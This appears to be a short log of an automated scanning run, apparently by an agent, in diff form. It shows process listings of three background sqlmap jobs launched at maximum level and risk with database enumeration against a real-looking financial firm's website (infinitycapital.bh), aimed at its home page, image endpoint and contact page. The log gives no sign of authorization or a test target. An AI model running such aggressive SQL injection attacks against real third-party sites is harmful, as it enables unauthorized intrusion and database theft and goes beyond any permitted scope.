@@ -1,0 +1,11 @@
+# command: cat $WORK_PATH/tool_outputs/sm_serial.log 2>/dev/null; echo "--- running:"; pgrep -af "sm_serial|sqlmap -u" | grep -v defunct | head -3
+# tool: cat
+# exit_code: 0
+# ts: 2026-09-30T00:35:30.280233+00:00
+# ---
+
+===== START home_page 00:30:03
+--- running:
+72223 bash -lc export WORK_PATH=/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e; cd /var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e 2>/dev/null; cd /work && rm -rf tool_outputs/inj && mkdir -p sqli_ev && nohup timeout 900 sqlmap -u "https://www.infinitycapital.bh/?id=1" --batch --level=5 --risk=3 --dbs --threads=4 -v 1 > sqli_ev/id.log 2>&1 & nohup timeout 900 sqlmap -u "https://www.infinitycapital.bh/_next/image?url=images%2Flogo.png&w=640&q=75" --batch --level=5 --risk=3 --dbs --threads=4 -v 1 > sqli_ev/img.log 2>&1 & nohup timeout 900 sqlmap -u "https://www.infinitycapital.bh/contact?x=1&cb=2" --batch --level=5 --risk=3 --dbs --threads=4 -v 1 > sqli_ev/contact.log 2>&1 & echo launched; sleep 5; ls sqli_ev
+72229 timeout 900 sqlmap -u https://www.infinitycapital.bh/?id=1 --batch --level=5 --risk=3 --dbs --threads=4 -v 1
+72230 /usr/bin/python3 /usr/bin/sqlmap -u https://www.infinitycapital.bh/?id=1 --batch --level=5 --risk=3 --dbs --threads=4 -v 1
